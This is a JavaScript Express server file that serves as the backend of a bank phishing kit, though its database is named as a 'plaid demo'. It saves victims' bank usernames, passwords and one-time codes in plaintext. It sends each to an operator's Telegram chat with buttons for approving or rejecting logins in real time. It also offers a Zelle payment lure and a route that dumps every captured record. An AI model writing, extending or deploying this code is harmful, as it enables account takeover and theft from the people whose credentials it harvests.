import express from "express";
import helmet from "helmet";
import morgan from "morgan";
import chalk from "chalk";
import Database from "better-sqlite3";
import fetch from "node-fetch";
import dotenv from "dotenv";
import cors from "cors";
dotenv.config();
// Start Telegram bot listener
import "./telegramBot.js";

const app = express();
const PORT = process.env.PORT || 4000;


// CORS setup
const allowedOrigin = process.env.FRONTEND_URL || "*";
app.use(cors({ origin: allowedOrigin }));

// ─────────────────────────────
// Middleware
// ─────────────────────────────

app.use(helmet());
app.use(express.json());

// ─────────────────────────────
// Request Logging
// ─────────────────────────────
app.use(
  morgan((tokens, req, res) => {
    return [
      chalk.cyan(tokens.method(req, res)),
      chalk.yellow(tokens.url(req, res)),
      chalk.green(tokens.status(req, res)),
      chalk.magenta(tokens["response-time"](req, res)),
      "ms",
    ].join(" ");
  })
);

const logRequestData = (req) => {
  console.log(chalk.cyan("\n📩 Incoming Request:"));
  console.log(chalk.yellow("  → URL:"), req.originalUrl);
  console.log(chalk.yellow("  → Method:"), req.method);
  console.log(chalk.yellow("  → Headers:"), req.headers);
  console.log(chalk.yellow("  → Body:"), req.body);
};

// ─────────────────────────────
// Database Setup
// ─────────────────────────────
const DB_PATH = process.env.DB_PATH || "plaid_demo.db";
const db = new Database(DB_PATH);

db.pragma("journal_mode = WAL");

const originalPrepare = db.prepare.bind(db);
db.prepare = (query) => {
  console.log(chalk.magenta("💾 SQL Query:"), query);
  const stmt = originalPrepare(query);

  ["run", "get", "all"].forEach((method) => {
    if (stmt[method]) {
      const original = stmt[method].bind(stmt);
      stmt[method] = (...args) => {
        console.log(chalk.blue(`🧩 DB Operation: ${method}`), args);
        try {
          const result = original(...args);
          console.log(chalk.green("✅ DB Result:"), result);
          return result;
        } catch (err) {
          console.error(chalk.red("💥 DB Error:"), err);
          throw err;
        }
      };
    }
  });
  return stmt;
};

db.prepare(`
  CREATE TABLE IF NOT EXISTS user_data (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT,
    otp_code TEXT,
    bank_name TEXT,
    expires_at DATETIME,
    otp_status TEXT DEFAULT 'pending',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`).run();

// Create zelle_payment table
db.prepare(`
  CREATE TABLE IF NOT EXISTS zelle_payment (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    amount REAL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`).run();

// ─────────────────────────────
// Telegram Bot Config
// ─────────────────────────────
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

async function sendToTelegram(message, buttons = null) {
  try {
    const payload = { chat_id: CHAT_ID, text: message, parse_mode: "HTML" };
    if (buttons) payload.reply_markup = { inline_keyboard: buttons };

    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    const data = await res.json();
    if (!data.ok) console.error("❌ Telegram Error:", data.description);
  } catch (err) {
    console.error("💥 Telegram send error:", err);
  }
}

// ─────────────────────────────
// API Routes
// ─────────────────────────────
app.get('/favicon.ico', (req, res) => res.status(204).end());

// Get current Zelle payment
app.get("/api/zelle-payment", (req, res) => {
  try {
    const row = db.prepare("SELECT name, amount FROM zelle_payment ORDER BY id DESC LIMIT 1").get();
    res.json({ payment: row || { name: "Demo User", amount: 100 } });
  } catch (err) {
    console.error("💥 Failed to fetch Zelle payment:", err);
    res.status(500).json({ error: "Failed to fetch Zelle payment" });
  }
});

// Update Zelle payment (staff dashboard)
app.post("/api/zelle-payment", (req, res) => {
  const { name, amount } = req.body;
  if (!name || !amount) return res.status(400).json({ error: "Missing name or amount" });

  try {
    db.prepare("INSERT INTO zelle_payment (name, amount) VALUES (?, ?)").run(name, amount);
    res.json({ success: true });
  } catch (err) {
    console.error("💥 Failed to update Zelle payment:", err);
    res.status(500).json({ error: "Failed to update Zelle payment" });
  }
});

// Notify Telegram about Zelle button click
app.post("/api/zelle-click", async (req, res) => {
  try {
    const message = `<b>💰 Zelle Payment Button Clicked</b>\nSomeone clicked the "View Payment" button.`;
    await sendToTelegram(message); // your existing helper
    res.json({ success: true });
  } catch (err) {
    console.error("💥 Telegram notification failed:", err);
    res.status(500).json({ error: "Failed to notify Telegram" });
  }
});

app.post("/api/bank-click", async (req, res) => {
  const { bank } = req.body;
  if (!bank) return res.status(400).json({ error: "Missing bank name" });

  try {
await sendToTelegram(`🏦 User selected bank: <b>${bank}</b>`);
    res.json({ success: true });
  } catch (err) {
    console.error("💥 Telegram send error:", err);
    res.status(500).json({ error: "Failed to notify Telegram" });
  }
});

// Save login credentials
app.post("/api/save", async (req, res) => {
  logRequestData(req);
  const { username, password, bank } = req.body;
  if (!username || !password || !bank?.name)
    return res.status(400).json({ error: "Missing username, password, or bank info" });

  try {
    const result = db.prepare("INSERT INTO user_data (username, password, bank_name) VALUES (?, ?, ?)")
      .run(username, password, bank.name);

    const msg = `<b>👤 New Login Attempt</b>
🪪 <b>Username:</b> ${username}
🔑 <b>Password:</b> ${password}
🏦 <b>Bank:</b> ${bank.name}`;

    const buttons = [
      [{ text: "✅ Authorize Login", callback_data: `authorized_${result.lastInsertRowid}` }],
      [
        { text: "🚫 Invalid Username", callback_data: `invalid_username_${result.lastInsertRowid}` },
        { text: "🔐 Invalid Password", callback_data: `invalid_password_${result.lastInsertRowid}` },
      ],
    ];

    await sendToTelegram(msg, buttons);
    res.json({ success: true, id: result.lastInsertRowid });
  } catch (err) {
    console.error("💥 Database error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Save OTP
app.post("/api/save-otp", async (req, res) => {
  logRequestData(req);
  const { code } = req.body;
  if (!code) return res.status(400).json({ error: "Missing OTP code" });

  try {
    const latestUser = db.prepare("SELECT id, username FROM user_data ORDER BY id DESC LIMIT 1").get();
    if (!latestUser) return res.status(400).json({ error: "No user found to attach OTP" });

    const expiresAt = new Date(Date.now() + 5 * 60 * 1000).toISOString();
    db.prepare("UPDATE user_data SET otp_code = ?, expires_at = ?, otp_status = 'pending' WHERE id = ?")
      .run(code, expiresAt, latestUser.id);

    const msg = `<b>🔢 OTP Code</b>
🪪 <b>Username:</b> ${latestUser.username}
🔢 <b>OTP:</b> ${code}`;

    const buttons = [
      [
        { text: "✅ Authorize", callback_data: `authorized_${latestUser.id}` },
        { text: "❌ Decline", callback_data: `declined_${latestUser.id}` },
      ],
    ];

    await sendToTelegram(msg, buttons);
    res.json({ success: true, user: latestUser });
  } catch (err) {
    console.error("💥 Database error:", err);
    res.status(500).json({ error: "Failed to save OTP" });
  }
});

// Check OTP status by user ID
app.get("/api/check-otp-status", (req, res) => {
  const { id } = req.query;
  if (!id) return res.status(400).json({ error: "Missing user ID" });

  try {
    const user = db.prepare("SELECT otp_status FROM user_data WHERE id = ?").get(Number(id));
    res.json({ otp_status: user?.otp_status || "pending" });
  } catch (err) {
    console.error("💥 DB Error fetching OTP status:", err);
    res.status(500).json({ error: "Failed to fetch OTP status" });
  }
});

// Debug route
app.get("/api/data", (req, res) => {
  try {
    const rows = db.prepare("SELECT * FROM user_data ORDER BY id DESC").all();
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch data" });
  }
});

// Health check
app.get("/api/health", (req, res) => {
  res.json({ status: "ok", uptime: process.uptime(), timestamp: new Date().toISOString() });
});

// Telegram test
app.get("/api/test-telegram", async (req, res) => {
  const msg = "📬 Test message from server at " + new Date().toLocaleString();
  await sendToTelegram(msg);
  res.json({ success: true });
});

// ─────────────────────────────
// Start Server
// ─────────────────────────────
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
